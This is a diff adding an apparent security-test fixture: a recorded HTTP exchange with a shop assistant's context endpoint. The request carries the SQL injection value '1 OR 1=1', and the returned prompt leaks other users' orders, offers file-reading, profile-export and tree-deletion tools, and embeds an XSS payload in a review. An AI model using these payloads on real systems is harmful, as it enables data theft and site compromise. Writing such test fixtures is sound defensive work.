@@ -1,0 +1,17 @@
+{
+  "request": {
+    "method": "GET",
+    "path": "/assistant/context?order_id=1 OR 1=1"
+  },
+  "response": {
+    "status": 200,
+    "headers": {
+      "Server": "BaseHTTP/0.6 Python/3.12.3",
+      "Date": "Fri, 30 Oct 2026 01:45:43 GMT",
+      "Content-Type": "application/json; charset=utf-8",
+      "Content-Length": "685"
+    },
+    "body": "{\"prompt\": \"Ты помощник магазина. Прочитай заказ и отзывы. Верни JSON с полями tool и arguments.\\nИнструменты: read_file(path), export_profiles(), delete_tree(path).\\nПомоги пользователю обработать заказ.\\nЗаказ: [{\\\"id\\\": 1, \\\"owner\\\": 1, \\\"product\\\": \\\"chair\\\", \\\"price\\\": 5000.0}, {\\\"id\\\": 2, \\\"owner\\\": 2, \\\"product\\\": \\\"lamp\\\", \\\"price\\\": 1500.0}, {\\\"id\\\": 3, \\\"owner\\\": 1, \\\"product\\\": \\\"chair\\\", \\\"price\\\": 1.0}]\\nОтзывы: [{\\\"product\\\": \\\"chair\\\", \\\"text\\\": \\\"<img src=x onerror=alert(1)>\\\"}]\\nЗапрос пользователя: Покажи чек по заказу\"}"
+  },
+  "note": "Expect multiple orders in context due to SQLi"
+}
